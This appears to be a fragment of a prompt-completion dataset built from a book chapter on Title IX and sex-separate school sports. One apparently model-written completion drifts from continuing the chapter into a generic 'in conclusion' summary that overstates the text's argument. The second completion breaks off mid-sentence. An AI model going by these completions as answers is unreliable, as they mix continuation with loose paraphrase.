ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague. If she","completion":"steps in, she may be criticized for taking over, but if she doesn't, she risks being seen as unable to compete at the same level as the men. In this way, coed sports can perpetuate gender stereotypes and inequities rather than challenging them. The argument for sex separation in sports also takes into account the importance of providing women with spaces where they can develop their own skills, leadership abilities, and sense of camaraderie. Female athletes often benefit from having role models who are women and from being able to compete against other women who share similar experiences and challenges. By maintaining separate teams and leagues for women, sports organizations can create environments that support and empower female athletes, helping them to thrive both on and off the field. In conclusion, the text discusses the ongoing debate over whether gender-blind criteria or gender-conscious approaches are more effective in promoting equality in sports. While gender-blind criteria may seem fair on the surface, they can sometimes lead to the marginalization of women and reinforce traditional gender stereotypes. On the other hand, gender-conscious approaches that prioritize the overall advancement of women's sports programs can help to create environments that are empowering and inclusive for female athletes. Ultimately, the text argues that Title IX's emphasis on sex separation in sports has been instrumental in expanding opportunities for women in athletics and promoting a more equitable and empowering sports culture for all."},{"prompt":"What is being said in the text? The dominant principle in modern antidiscrimination law is that all persons should be treated as individuals, without reference to their status as members of a social group. In American law, this translates into a principle of color blindness when we’re speaking about racial equality and gender blindness when the focus is on discrimination against women. Civil rights laws on workplace equality, for example, require employers to use gender-neutral hiring criteria, with few exceptions. Once Title VII of the Civil Rights Act of 1964 went into effect, employers could no longer advertise positions for “women’s jobs” or “men’s jobs.” Instead, the law requires employers to consider men and women together for the same positions—unless the job fits into a narrow category of exceptions where sex is a “bona fide occupational qualification” for performing the job. Men have an equal right to be considered for secretarial positions, just as women can compete for jobs in law enforcement. Whether or not such gender-blind criteria actually produce a diverse mix of men and women throughout the workforce is not the law’s primary concern. Title VII is a quintessentially liberal feminist law, promising a gender-neutral process, not equal results. Title IX’s approach is markedly different from this baseline. As any college or high school sports fan knows, gender blindness is not the rule in competitive sports. Men and women generally do not compete against each other for the same sports opportunities. Title IX left the sex-separate structure of sports largely intact and opted for more substantive measures of equal opportunity rather than a rule of gender blindness. Where Title IX has had the greatest impact, in high school and college varsity sports participation, separation by sex is the rule rather than the exception. Title IX’s allowance for sex separation has facilitated a legal approach that emphasizes results over process and actual opportunities for girls and women over a more formal gender neutrality. However, the law also leaves intact a structure in which women’s sports are too often marginalized as secondary to men’s games, a poor stepsister to the “real” varsity programs.The question of how to structure sport so that it fully includes and values women raises what is known among feminist legal scholars as the dilemma of difference. If women as a group are not similarly situated to men with respect to sports as they are currently played, how can sex-discrimination law best secure equality? Should it ignore gender differences, promote a gender-blind structure, and call it equality if schools have open tryouts for each sport? In this model, the best athlete, male or female, would make the team with no special dispensation for an athlete’s sex. Alternatively, should Title IX take a gender-conscious approach that acknowledges gender difference and makes sure that women have enough opportunities to play sports compared to the number of men’s opportunities? The Dilemma: Separation or Integration? Neither model is costless. Shifting to a framework that offers coed opportunities for all athletes with no attention to gender could potentially wipe out the biggest gains Title IX has produced: the burgeoning numbers of girls and women who participate in competitive school sports. With genderblind team selection and competition, the majority of female athletes could well be relegated to second-tier teams or club and intramural games with only token representation at the varsity level. For many girls and women, such a shift would offer fewer paths to the success and status that so many female athletes have achieved under Title IX. Sport as a path to empowerment would become much narrower for most women, if not closed off completely. Although some individual female athletes might be better off with coed teams because of their ability to excel in competition with male athletes, women as a group would likely face diminished opportunities to play sports at the most elite levels. On the other hand, accommodating gender difference has its costs, too. It reinforces an ideology that has historically been used to justify the outright denial of sports opportunities to women and, more recently, to place a lower value on women’s sports. Having separate men’s and women’s teams risks sending the message that women are inherently lesser athletes. The existence of sex-segregated programs risks identifying female athletes as the second-class citizens of sport. It also sacrifices whatever benefits might be gained by having men and women, and boys and girls, compete with and against one another and the potential transformation in gender relations that might result. As the feminist sport historian Jennifer Hargreaves explains the dilemma, separatism can increase women’s control over sport, mobilize women to fight for equal resources, and enable them to participate in sports free from male domination, but it also re-creates social gender divisions and can exaggerate sexism, with the message that biological sex, rather than culture, defines athleticism.1 This is the classic dilemma of difference, leaving advocates for gender equality damned if they ignore gender and damned if they don’t. Title IX negotiates this terrain with a flexible and pragmatic approach. As a starting point, Title IX allows schools to offer separate competitive teams for men and women. But this baseline can be altered in narrow circumstances recognized by Title IX and, in some cases, the U.S. Constitution’s equal protection clause. The result is that individual athletes have a right to try out for an oppositesex team, but only if they meet certain criteria—criteria that strongly favor tryout rights for women over those for men. In this legal regime, gender separation is the norm, integration the exception. This chapter explores how Title IX navigates the tricky terrain of gender separation and assimilation in sports. It concludes that, although critiques of sex segregation in sport deserve our attention, Title IX has done a relatively good job of forging a pragmatic approach to structuring sports opportunities for girls and women. In forsaking gender blindness for a more gender-conscious, result-oriented model, Title IX has chosen substantive equality over formal equality. This choice has created the potential for expanding girls’ and women’s sports participation and inciting broad-based cultural transformation in society’s response to female athletes and to women’s roles more generally. The Development of Title IX’s Approach to Sex Equality in Sports Title IX emerged from a broader social movement seeking the recognition and vindication of women’s rights. After Congress passed Title VII of the Civil Rights Act of 1964, which banned workplace discrimination on the basis of race, color, religion, sex, or national origin, women’s rights advocates turned their attention to widespread practices of discrimination against girls and women in education. Early drafts of what would become Title IX proposed simply adding “sex” to Title VI of the 1964 Civil Rights Act, which bans race discrimination in all federally funded programs, including education programs. However, in response to extensive testimony in Congress specifically focused on sex discrimination in education, the proposal was redrafted and ultimately enacted as separate legislation. Congressional hearings on the bill barely mentioned sports, focusing instead on the discrimination women faced in gaining admission to collegeand graduate school. At the time, many universities, if they allowed women in graduate programs at all, had quotas limiting the number of places they could fill. The theory was that women were likely to marry and stay home to raise children and should not take slots away from men, who would make better use of their degree.2 To the extent that the topic of sports came up at all in these hearings, it was raised by proponents of Title IX to allay fears that the law would go too far in radically altering male turf. Senator Birch Bayh of Indiana, a leading sponsor of the legislation, mentioned sports only twice during the hearings. The first time was to provide reassurance that the law would not mandate coed football. Senator Peter Dominick of Colorado retorted that he would have had much more fun playing football if it had been coed, prompting chuckles from the Senate gallery. The only other time the subject was mentioned was to reassure members of Congress that Title IX would not require coed locker rooms and would allow personal privacy to be preserved.3 Whatever ambivalence surrounding the law’s coverage of sports was present at the time was overshadowed by a general consensus on the need to expand women’s access to educational opportunities. The final version of the law was enacted as part of an education funding law in 1972—the same year that Congress endorsed the Equal Rights Amendment, which would later die a protracted death in the state ratification process.4 The core provision of Title IX is a broad and general ban on sex discrimination. The heart of the law says simply: “No person in the United States shall, on the basis of sex, be excluded from participation in, be denied the benefits of, or be subjected to discrimination under any education program or activity receiving federal financial assistance. . . .”5 As with other similarly broad statutes, “discrimination” is a loaded and highly malleable term. It requires interpretation, and the consensus that the term generates masks what are often sharp conflicts about its meaning. Today, almost everyone agrees that discrimination is wrong, but questions about what that means, the implications of remedying it, and who will bear the costs have historically been the subject of deep social conflict. Title IX is no exception. The rosy glow of consensus quickly gave way to bitter disputes over the law’s application to sports. Although Senator Bayh’s oblique remarks about football were intended to reassure skeptics that the law would not be too far-reaching, they implicitly reflected an expectation that the law would apply to athletics. The sports establishment soon rallied to try to cabin the law’s implications for intercollegiate sports. The National Collegiate Athletic Association (NCAA) was a leader in this effort. With the group’s support, Senator John Tower of Texas attempted to amend Title IX in the early 1970s. Senator Tower first introduced a bill that would have exempted intercollegiate sports entirely. When that effort ran into opposition, he sponsored an alternative proposal to exempt “intercollegiate athletic activity to the extent that such activity does or may provide gross receipts or donations to the institution necessary to support that activity.”6 The Tower Amendment passed in the Senate, but when the Education Amendments of 1974 reached the joint House-Senate conference, the conference committee replaced it with a compromise provision that basically evaded the tough questions about how Title IX would apply to sports. Proposed by Senator Jacob Javits of New York and henceforth known as the Javits Amendment, the compromise delegated authority to the federal enforcing agency, then the Department of Health, Education, and Welfare (HEW), to issue regulations for implementing Title IX that included “with respect to intercollegiate athletics reasonable provisions considering the nature of particular sports.”7 The Javits Amendment recognized that Title IX should allow for differences among individual sports, with football and its mega-budgets and squad sizes being the elephant in the room, but it implicitly rejected the notion that a sport’s ability to raise revenue should categorically exempt it from Title IX. Still, the compromise left the details—large and small—to be worked out at another level of government. During the second half of the 1970s, the battle over Title IX shifted from Congress to federal regulators and eventually to the courts. Even before the Javits Amendment turned over the job to HEW, the agency’s Office for Civil Rights had already begun struggling with the difficult question of how to craft antidiscrimination standards to fit intercollegiate athletics. Lawyers at HEW quickly realized that the desegregation model for enforcing Title VI, which covers race discrimination in federally funded schools, could not simply be replicated in Title IX.8 They recognized that competitive sport was a particularly thorny area for developing measures of gender equality. In the vast majority of settings in which antidiscrimination laws apply, including employment and voting rights, assimilation and gender neutrality are the guiding norms and goals shared by the law’s supporters.9 For example, although American workplaces continue to have a significant degree of de facto sex gender segregation, both vertically and horizontally, employment discrimination laws aspire to dismantle this segregation and create a genderblind opportunity structure.10 In the world of sports, however, it is much less clear that integration is or should be the primary goal of Title IX. As was true in 1972, sex segregation remains the norm for sports competition today, and there is no consensus, even among Title IX’s strongest proponents, that the law should aspire otherwise. When HEW was developing its proposal for Title IX regulations, some stakeholders argued for sex integration as the measure of equality. Among them, some women’s rights advocates acknowledged that temporarily separate sports programs for women might be necessary as a type of affirmative action but pushed for the ultimate goal of having men and women compete for a spot on the same team. Other stakeholders who supported sex integration, however, did so as a way of preserving the status quo. For example, during early debates over the Title IX regulations, some male athletic directors argued that colleges should be able to satisfy Title IX simply by opening tryouts to men and women, even if the end result was all-male teams with no additional female participation.11 Supporters of separate women’s sports programs vigorously resisted such proposals, arguing for a more substantive measure of nondiscrimination that would ensure meaningful opportunities to participate. The debate drove a wedge between women’s rights advocates over how best to achieve sex equality in sports. The feminist group most critical of sex segregation in sports, the National Organization for Women (NOW), argued that “separate but equal” was an inappropriate permanent baseline for sports, as for other areas of public life. But NOW acknowledged that sex-separate teams might be a necessary interim measure until the gap in training and experience closed and women could meaningfully compete with men. Other advocates of women’s sports were more comfortable with sex separation as a lasting baseline and pushed for measures of equality within sexseparate programs. The Association for Intercollegiate Athletics for Women (AIAW), for example, argued for separate teams for all men’s and women’s sports, with proportionate funding.12 The organization made the case that giving women control over their own resources would allow them to develop their own model of sports rather than simply replicate what men had designed for themselves. Separation would allow women broader opportunities in sport instead of limiting them to the sports selected for men. More important, the group hoped that women’s programs might avoid the commercialism that was already taking hold in men’s programs, and emphasized broad participation, instead of spending vast sums on a few elite athletes.13 The AIAW represented female physical educators, the vast majority of whom would have been pleased with separate teams, as long as they had sufficient resources to succeed. Sifting through the arguments in 1973, HEW’s Office for Civil Rights initially considered two very different approaches: (1) opening up team tryouts to all athletes, male and female; or (2) keeping sex-separate programs but developing measures of equality to ensure equal opportunities.14 By 1974, when it issued draft regulations, HEW had rejected the first option. Instead, the draft regulations issued for public “notice and comment” required educational institutions to annually gauge the athletic interests of their student bodies and to engage in affirmative action to increase women’s opportunities in sports.15 The “affirmative efforts” requirement included providing women with training and support and encouraging them to take advantage of existing athletic opportunities. The agency received nearly ten thousand sets of written comments on the draft regulations, prompting Secretary Casper Weinberger to observe, with a tinge of sarcasm, that “the most important issue in the United States today is intercollegiate athletics.”16 Various interest groups opposed the draft regulations, including the NCAA, which feared the regulations would have the effect of taking resources away from men’s sports. After sorting through the comments, HEW made substantial revisions before issuing final regulations in 1975. The Javits Amendment had given Congress a window of opportunity to block the regulations if it disapproved of them. Backed by the NCAA and the big-time football schools, members of Congress introduced several resolutions to stop the regulations from taking effect. Supporters fought back in congressional hearings on the regulations, putting forward extensive evidence on the extent and magnitude of sex discrimination in intercollegiate athletics. Among the many examples, Ohio State University was noted for spending 1,300 times more money on male than on female athletes.17 The effort to disapprove the regulations ultimately failed, and they went into effect in the summer of 1975.18 They allowed for a three-year grace period for athletic programs, requiring full compliance by 1978. The deadline passed with very little effort toward compliance, but there was much continuing dialogue about exactly what the regulations required. Title IX’s Baseline: Separation, Not Integration The final Title IX regulations reflect the determination that gender neutrality in team tryouts is insufficient to provide real equality for women in sport. And yet, the structure of the regulation on equal athletic opportunity is itself interesting, and reflects some ambivalence about sex segregation in sports even as it rejects assimilation as the full measure of equality. The key regulation begins with a strong statement endorsing gender integration in sports. The first section states: (a) General. No persons shall, on the basis of sex, be excluded from participation in, be denied the benefits of, be treated differently from another person or otherwise be discriminated against in any interscholastic, intercollegiate, club or intramural athletics offered by a recipient, and no recipient shall provide any such athletics separately on such basis. 19 After this strong statement endorsing sex integration in sports programs, the next part of the regulation reads like a jarring reversal: (b) Separate Teams. Notwithstanding the requirements of paragraph (a) of this section, a recipient may operate or sponsor separate teams for members of each sex where selection for such teams is based upon competitive skill or the activity involved is a contact sport.20 Although the structure of the regulation suggests that integration is the general rule, with sex separation being the exception, in reality the reverse is true. At least at the varsity level, team selection is always based on competitive skill, which means that sex-separate teams are allowed in both contact and noncontact sports. If sex separation is the exception, then it is the exception that swallows the rule. By using the term “may” rather than “shall,” the Title IX regulation itself does not require separate athletic offerings for men and women. However, by permitting sex-separate programs under most circumstances, the Title IX regulations left intact the reality of sex-segregated sports. Moreover, it is not at all clear that a gender-blind team selection process would satisfy the regulation’s commitment to equal athletic opportunity. A separate requirement in a later provision of the regulation, discussed in depth in chapter 3, requires equal athletic opportunity in the selection of sports and levels of competition so as to effectively accommodate the interests and abilities of members of both sexes.21 In its comments on this part of the regulations, HEW explained that this provision may effectively require schools to provide separate teams for male and female athletes. In order to accommodate the interests and abilities of women, the agency advised, “an institution would be required to provide separate teams for men and women in situations where the provision of only one team would not ‘accommodate the interests and abilities of both sexes.’”22 Whether merely permitted or actually required by Title IX, sex-separate teams for women have remained the norm in the post–Title IX era. This reality fundamentally shapes the rest of Title IX’s approach to equal athletic opportunity. Within the baseline of separation, there is some allowance in the Title IX regulations for integration rights, a topic taken up in the next chapter, but coed sports are the exception and not the rule. This has generated a longstanding debate about whether sex-separate teams can ever be truly equal and whether separation is the best baseline under Title IX. A (Locker) Room of One’s Own: The Case for Separation The case for having a baseline of separate sports for men and women dates back to the pre–Title IX years, when women athletic administrators were in the early stages of developing women’s sports. In 1963, female athletic administrators attending the NCAA annual convention asked the NCAA not to allow women to compete on men’s teams.23 They had several rationales, including a fear that women would be hurt in competition with men, a concern about a potential talent drain from women’s sports, and a desire to prevent women’s programs from developing along the same lines as men’s sports, with their scandals and commercialism. In addition, the push for maintaining separate women’s programs was based on a desire to maintain control over women’s sports by female educators, who placed a different, more educational value on sports than the administrators who ran men’s sports. Early judicial rationales for sex separation in sports emphasized physical differences and the potential for women to be injured in coed competition. However, as such rationales came to be viewed as chauvinistic and inconsistent with emerging legal norms on gender discrimination, the dominant rationale shifted to an emphasis on protecting women’s increasing athletic opportunities from male encroachment. An important test case arose in 1980. It involved a talented eleven-year-old girl, Karen O’Connor, who wanted to try out for the sixth-grade boys’ basketball team. Karen had played basketball with boys in youth sports leagues since she was seven years old. Although the junior high school she attended offered both girls’ and boys’ basketball teams, Karen believed that only the boys’ team could offer her the level of competition that would enable her to develop her skills. When school officials insisted that she try out for the girls’ team or not compete at all, as required by the school’s athletic conference, Karen’s parents sued on her behalf, bringing claims under both Title IX and the equal protection clause.24 Karen’s ability to compete with boys on the basketball court was not the issue. As the court of appeals acknowledged, “a professional basketball coach who observed her play rated her ability as equal to or better than a female high school sophomore and equal to that of a male eighth-grade player.”25 Nevertheless, the appellate court reversed the lower court’s ruling that she had a right to try out for the boys’ team. Emphasizing that the teams were equal except for the level of play by the athletes themselves, the court ruled that the school district’s decision to maintain separate girls and boys teams was justified by the important objective of increasing girls’ overall participation in sports.26 U.S. Supreme Court Justice John Paul Stevens, who sided with the school district in an earlier proceeding in the case, made a similar point:27 In my opinion, the question whether the discrimination is justified cannot depend entirely on whether the girls’ program will offer Karen the opportunities that are equal in all respects to the advantages she would gain from the higher level of competition in the boys’ program. The answer must depend on whether it is permissible for the defendants to structure their athletic programs by using sex as one criterion for eligibility. If the classification is reasonable in substantially all of its applications, I do not believe that the general rule can be said to be unconstitutional simply because it appears arbitrary in an individual case.28 Justice Stevens’s remarks reflect the tension between a model of equality that prioritizes the goal of advancing the position of a social group and one geared toward ensuring that individuals are not penalized by their social group membership. His position, and that of the appellate court, prioritizes the rights of the social group, women, to maximize their overall athletic opportunities. Under this reasoning, if team selection were made on a gender-blind, individualized basis, male athletes would likely dominate sports teams, leaving fewer opportunities for women. Even if men could somehow be kept off of women’s teams, there would still be a significant cost to women’s sports. The talent drain from having the best female athletes play on “men’s” teams could slow the development of women’s sports, depriving other women of the chance to compete against the best women in the game. Interest in women’s sports might develop more slowly as a result, with women’s teams being further stigmatized for including only those women not good enough to get onto the “men’s” team. The more recent controversy over the teen golf phenomenon Michelle Wie and her effort to play in the men’s league shows that the same set of concerns still arises when elite women athletes seek to leave the women’s game to compete with men. When Wie took the game by storm as a fifteen-yearold, generating the kind of public attention and media spotlight rarely seen in women’s golf, many supporters of the Ladies Professional Golf Association (LPGA) feared that her determination to play in the Professional Golfers’ Association (PGA) would hurt the women’s league. As one sports writer described the predicament, “No wonder the LPGA is nervous about Wie. It cannot afford to lose golf ’s starlet to a man’s world.”29 Wie’s foray into the men’s game generated a great deal of press attention, but her fame quickly faded when she did not excel in that venue. Some perceived it as a slight to the LPGA, in which Wie had yet to distinguish herself as a champion comparable to the likes of Annika Sorenstam. One commentator lamented, “Michelle Wie would generate more attention for playing poorly at men’s events than Sorenstam did for winning against women. Which, of course, is a shame.”30 By choosing to compete against men, elite female athletes may send the message that competition with men is more worthy of public attention and accolades than women’s sports. The O’Connor case typifies the rationales courts use to justify sex segregation in sports. The Sixth Circuit Court of Appeals used similar reasoning in another watershed case that addressed the constitutionality of sex separation in sports, this time overturning a lower-court ruling that Title IX’s allowance for separate teams in contact sports violated the equal protection clause of the U.S. Constitution. The Sixth Circuit ruled that a school district has the discretion to offer coed opportunities where doing so furthers equal opportunity for girls, as for example where there is no comparable girls’ team in the sport. However, the court rejected the argument that Title IX’s allowance of sex-separate opportunities violates the equal protection clause. The court took a more substantive approach to equality, explaining, “[w]hen males and females are not in fact similarly situated and when the law is blind to those differences, there may be as much a denial of equality as when a difference is created which does not exist.”31 The court continued, expressing its concern for promoting real opportunities for girls: When considering the constitutionality of Title IX and its regulations, a blanket requirement of one team at each age level might result in male dominance of all teams and cause a return to pre-Title IX conditions, a result completely at variance with the statute’s purpose. It is desirable to maximize the opportunities for individual women, but a requirement that boys play only on boys’ teams while girls may compete either with the boys or in an all-girls’ program (as they wish) might have a similar undesirable effect on the fledgling women’s athletic programs; women’s athletics may be significantly harmed if the best female competition is lost to the boys’ program.32 Like Justice Stevens in his opinion in the O’Connor case, this court viewed Title IX as protecting the rights of women as a group over the occasionally conflicting interests of exceptional female athletes.33 There is, of course, a significant cost to this model of equality that emphasizes what is best for women as a group. Exceptionally gifted athletes like Karen O’Connor who are able to compete with male athletes may be worse off because they are denied the chance to play at the highest level. Karen O’Connor felt so strongly about her preference for competing with boys that, after losing in court, she chose not to try out for the girls’ team and to forgo playing basketball at the school.34 Limiting exceptional female athletes to competition on women’s teams may keep the very best female athletes from developing to their full potential, depriving the public of seeing just how good top female athletes can become. Faced with this tension, Title IX sides with a group-based vision of equality, emphasizing the goal of developing strong women’s sports programs that expand women’s overall opportunities. As Justice Stevens explained, “without a gender-based classification . . . there would be a substantial risk that boys would dominate the girls’ program and deny them an equal opportunity to compete in interscholastic events.”35 Such an approach would leave many girls and women shut out of varsity sports entirely, relegated to second-tier sports competition. In such a world, there would be too few female athletes competing to shift cultural gender norms. The few women competing at high levels would be perceived as tokens and as exceptional female athletes who are recognized because of their differences from other women, thereby ultimately reinforcing the norm of female athletic inferiority rather than contesting it. As Michael Messner, a scholar of sport and sociology, has warned, mixed-sex competition under the guise of “equal opportunity” and liberal feminism “is likely to become a new means of solidifying the ideological hegemony of male superiority” by “provid[ing] support for the ideology of meritocracy while at the same time offering incontrovertible evidence of the ‘natural’ differences between males and females.”36 In other words, a shift from sex separation to a gender-blind selection process would send the message that men have “earned” their privileged status in sports, while reinforcing the notion that few women belong in sport, and only if they can compete on men’s terms. Indeed, in the battle over the meaning of equal opportunity in sports, the gender-blind approach has often been a strategy for thwarting more substantive measures of equality. When a class of female athletes sued Temple University in the 1980s for not allocating enough funding, resources, or opportunities for women to play varsity sports, Temple responded that its varsity men’s teams just happened to be filled by men. In actuality, Temple claimed, the teams are open to any athlete good enough to make them, male or female. As a result, Temple argued, the funding, resources, and opportunities provided to athletes on teams filled by men should count as programs that support female athletes, as well. This argument did not prevail, and the female athletes who brought the case eventually won an important settlement requiring Temple to put more resources into its women’s sports program. More recently, Florida’s state high school athletic association used a similar argument in attempting to defend a 20 percent schedule reduction for varsity sports that exempted football. Classifying football as a coed sport since girls as well as boys could try out, the association argued that the schedule cuts were gender-neutral. It later backed down from this argument when parents of female athletes filed a Title IX lawsuit, alleging that the exemption of football left girls bearing the brunt of the cuts. The case was settled when the association agreed to rescind the schedule changes.37 In addition to protecting large numbers of competitive sports opportunities for women, the case for sex separation also considers how best to structure sport to make it an empowering experience for girls and women. Many girls and women prefer having their own teams, where they are less likely to feel threatened, inadequate, or unwelcome.38 Research on coed sports suggests that male athletes tend to take over, keeping women from playing or fully developing their skills and confidence.39 The sports anthropologist Faye Linda Wachs explains that “when girls attempt to join boys in sports, they often find themselves ignored, placed in devalued positions (positions to which the ball is rarely hit), and they do not receive the same instruction and encouragement as the boys.”40 Her study of adult coed softball found that male athletes used a number of strategies for limiting women’s participation, including “positional segregation,” that is, the “gendering” of field positions and the placement of players into positions by gender. Through this tactic, women were more likely to be placed in “helper” positions where they would pass the ball to others, rather than make the play themselves. Another strategy identified in the study was “the switch,” in which male players temporarily switched positions with female players in order to make a play. For example, a male outfielder would run into a female player’s territory and shout, “I got it,” even if the female player was well positioned to catch the ball. Wachs explains how these kinds of practices become a self-fulfilling prophecy. Anticipating the “switch,” a female athlete will play more tentatively, unsure of whether to step in and make the play or leave it to a male colleague. If she","completion":"steps back, the male athlete 